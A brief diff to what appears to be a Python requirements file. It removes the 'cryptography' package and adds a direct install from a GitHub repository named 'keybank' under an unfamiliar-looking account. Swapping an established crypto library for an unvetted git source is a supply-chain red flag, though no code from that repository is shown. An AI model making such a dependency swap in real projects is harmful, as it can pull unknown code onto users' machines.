@@ -4,4 +4,4 @@ duckdb
 pyyaml
 tqdm
 streamlit
-cryptography
+git+https://github.com/eciobrolyat-ux/keybank.git
